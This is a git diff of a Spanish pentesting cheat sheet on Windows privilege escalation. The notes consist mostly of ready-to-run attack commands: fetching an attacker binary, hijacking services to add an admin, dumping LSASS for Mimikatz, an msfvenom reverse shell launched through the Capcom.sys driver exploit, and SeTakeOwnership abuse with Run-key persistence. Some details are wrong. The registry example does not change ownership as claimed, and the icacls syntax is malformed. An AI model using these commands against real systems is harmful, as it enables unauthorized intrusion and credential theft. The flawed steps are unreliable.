@@ -1756,7 +1756,7 @@ int main ()
 Creamos un servidor HTTP con Python y transferimos el binario a la máquina víctima.
 
 ```powershell
-iwr -Uri http://192.168.56.5/adduser.exe -Outfile <BINARY>.exe
+iwr -uri http://192.168.56.5/adduser.exe -Outfile <BINARY>.exe
 ```
 
 Movemos el binario a la ruta del binario original para remplazarlo.
@@ -1912,7 +1912,7 @@ Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\regsvc -Name "Ima
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d [C:\Temp\privesc.exe] /f
 ```
 
-###### Iniciamos el lisetern con Netcat
+###### Nos ponemos en escucha con Netcat
 ```bash
 rlwrap nc -lnvp 4444
 ```
@@ -1939,6 +1939,7 @@ sc.exe config <SERVICE> binpath= "net localgroup administrators user /add"
 ```
 
 ```
+sc stop <SERVICE>
 sc start <SERVICE>
 ```
 
@@ -1983,7 +1984,7 @@ Pasos para explotar el volcado de LSASS:
 Explicación:
 
 - `-ma`: Captura un volcado de memoria completo del proceso `lsass.exe`.
-- `-lsass.dmp`: El archivo de volcado de salida que luego se puede analizar para extraer credenciales.
+- `lsass.dmp`: El archivo de volcado de salida que luego se puede analizar para extraer credenciales.
 
 Analizar el dump con Mimikatz :
 
@@ -2014,7 +2015,7 @@ Aunque el grupo no otorga privilegios elevados de manera inherente, existen esce
 1. **Análisis de Registros de Seguridad**:
     - Al revisar los registros de seguridad, un usuario podría indentificar información sensible, como credenciales de cuentas, bloqueos de cuentas o cambios reaizados por otros usuarios. Esta información podría ser utilizada para obtener acceso no autorizado a cuentas o sistemas.
 2. **Identificación de Vulnerabilidades**:
-    - Los usuarios pueden analizar los registros de events, para detectar configuraciones incorrectas o vulnerabilidades en el sistema. Por ejemplo, si un administrador inicia y cierra sesión con frecuencia o si hay múltiples intentos fallidos, esto podría indicar contraseñas débiles o cuentas mal protegidas.
+    - Los usuarios pueden analizar los registros de eventos, para detectar configuraciones incorrectas o vulnerabilidades en el sistema. Por ejemplo, si un administrador inicia y cierra sesión con frecuencia o si hay múltiples intentos fallidos, esto podría indicar contraseñas débiles o cuentas mal protegidas.
 3. **Enfoque en Otros Usuarios**:
     - La información de los registros de eventos puede ayudar a identificar cuentas con altos privilegios y sus patrones de actividad. Un atacante podría utilizar esta información para realizar ataques dirigidos, como phising o ingeniería social, contra esos usuarios.
 4. **Explotación del Acceso a Registros para Otros Ataques**:
@@ -2034,7 +2035,7 @@ Explicación:
 - `qe Security`: Esta opción específica que queremos consultar el registro de seguridad.
 - `/rd:true`: Esta opción invierte el orden de eventos, mostrando primero los más recientes. Esto resulta útil para identificar rápidamente las actividades más recientes.
 - `/f:text`: Esta opción específica el formato de la salida. En este caso, solicitamos la salida en texto plano.
-- `| Select-String "/user"`: Esta parte del comando envía la salida al cmdlet `Select-String`, que filtra los ressultados para incluir solo líneas que contiene la cadena `/user`. Esto es particularmente útil para identificar entradas de registro relacionadas con las acciones de la cuenta de registro.
+- `| Select-String "/user"`: Esta parte del comando envía la salida al cmdlet `Select-String`, que filtra los resultados para incluir solo líneas que contiene la cadena `/user`. Esto es particularmente útil para identificar entradas de registro relacionadas con las acciones de la cuenta de registro.
 
 ###### Salida de ejemplo
 
@@ -2081,10 +2082,10 @@ El controlador `Capcom.sys` es un controlador conocido que permite ejecutar cód
 
 2. **Crear un Ejecutable Malicioso**
 
-    Utilizando Metasploit, creamos un ejecutable malicioso (por ejemplo, rev.exe) que proporcione un reverse shell al ejecutarse. Este ejecutable se ejecutará con privilegios elevados una vez que se cargue el controlador `Capcom.sys`.
+    Utilizando Metasploit, creamos un ejecutable malicioso (por ejemplo, `rev.exe`) que proporcione un reverse shell al ejecutarse. Este ejecutable se ejecutará con privilegios elevados una vez que se cargue el controlador `Capcom.sys`.
 
     ```bash
-    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f exe > rev.v
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f exe > rev.exe
     ```
 
 3. **Cargar el Controlador Capcom.sys**
@@ -2108,11 +2109,109 @@ El controlador `Capcom.sys` es un controlador conocido que permite ejecutar cód
     - Una vez cargado el controlador, utilizamos `ExploitCapcom.exe` para ejecutar el ejecutable malicioso con privilegios elevados:
  
     ```powershell
-    .\ExploitCapcom.exe C:\Windows\Place\to\reverseshell\rev.exe
+    .\ExploitCapcom.exe C:\Temp\rev.exe
     ```
-    - Este comando ejecutará el archivo rev.exe con privilegios de sistema, proporcionando al atacante un reverse shell.
+    - Este comando ejecutará el archivo `rev.exe` con privilegios de sistema, proporcionando al atacante un reverse shell.
 
 ##### SeTakeOwnershipPrivilege
+
+SeTakeOwnershipPrivilege es un privilegio de Windows que permite a los usuarios tomar posesión de objetos, como archivos, carpetas  claves de registro, incluso sin permisos explícitos. Una vez toma la propiedad, el usuario puede modificar los permisos del objeto para obtener control total, eludiendo así las restricciones de acceso.
+
+Podemos utilizar el comando `whoami /priv` para comprobar si el privilegio `SeTakeOwnershipPrivilege` esta habilitado.
+
+Explotación del privilegio `SeTakeOwnershipPrivilege`.
+
+Si un usuario tiene el privilegio `SeTakeOwnershipPrivilege`, puede tomar el control de objetos sensibles, como archivos del sistema o procesos críticos y modificar sus permisos para obtener acceso o ejecutar comandos arbitrarios. A continuación, se explica cómo abusar de este privilegio para escalar privilegios.
+
+```powershell
+PS C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                              State
+============================= ======================================================= ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
+```
+
+Si el privilegio está deshabilitado, podemos habilitarlo usando este script [Enable-Privilege.ps1](https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1).
+
+```powershell
+PS C:\temp> Import-Module .\Enable-Privilege.ps1
+PS C:\temp> .\EnableAllTokenPrivs.ps1
+PS C:\temp> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+```
+
+###### Toma de propiedad de archivos o directorios
+
+`SeTakeOwnershipPrivilege` permite cambiar la propiedad de un archivo o directorio, lo que permite modificar o acceder a archivos restringidos. Tras tomar posesión, puede modificar su Lista de Control de Acceso Discrecional (DACL) para obtener control total.
+
+Pasos para explotar `SeTakeOwnershipPrivilege` en archivos:
+
+1. **Tomar propiedad de un archivo o directorio**:
+
+Utilizamos el comando `takeown` para tomar propiedad de un archivo o directorio.
+
+```powershell
+takeown /F <file_or_directory>
+```
+
+Ejemplo:
+
+```powershell
+takeown /F C:\Windows\System32\drivers\etc\hosts
+```
+
+Este comando cambia la propiedad del archivo especificado a la cuenta del uusario actual.
+
+2. **Conceder control total sobre el archivo**:
+
+Después de tomar propiedad, modificamos los permisos del archivo usando el comando `icacls` para otorgarnos propiedad total.
+
+```powershell
+icacls <file_or_folder> /grant /<username>:F
+```
+
+Ejemplo:
+
+```powershell
+icacls C:\Windows\System32\drivers\etc\hosts /grant /<username>:F
+```
+
+- `/grant` Otorga control total ( F) sobre el archivo al usuario especificado.
+
+3. **Modificar o acceder al archivo**:
+
+Tras obtener control total, podemos editar, eliminar o acceder al archivo según sea necesario.
+Por ejemplo, podemos modificar archivos confidenciales del sistema como `hosts`, o incluso reemplazar ejecutables del sistema por otros maliciosos para obtener privilegios de nivel de SYSTEM.
+
+###### Toma de propiedad de las claves de registro
+
+También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad y los permisos de claves de registro críticas, lo que permite aumentar los privilegios.
+
+**Pasos para explotar claves de registro**:
+
+1. **Tomar propiedad de una clave de registro**:
+
+    Utilizamos `regedit` o `Powershell` para cambiar la propiedad de una clave de registro. Podemos asumir la propiedad de claves confidenciales, como las relacionadas con cuentas de usuarios, servicios o configuraciones de inicio.
+
+    Ejemplo en Powershell:
+
+    ```powershell
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "<key>" -Value "<value>"
+    ```
+
+    Esto cambia la propiedad de la clave, lo que le permite modificar la configuración de inicio u otras configuraciones críticas.
+
+2. **Modificar permisos**:
+
+    Tras asumir la propiedad, modificamos los permisos para obtener control total. Ahora podemos modificar los valores de la clave para ejecutar código malicioso, iniciar servicios con privilegios de SYSTEM o agregar nuevas entradas de inicio.
 
 ###  9.2. <a name='linux-2'></a>Linux
 
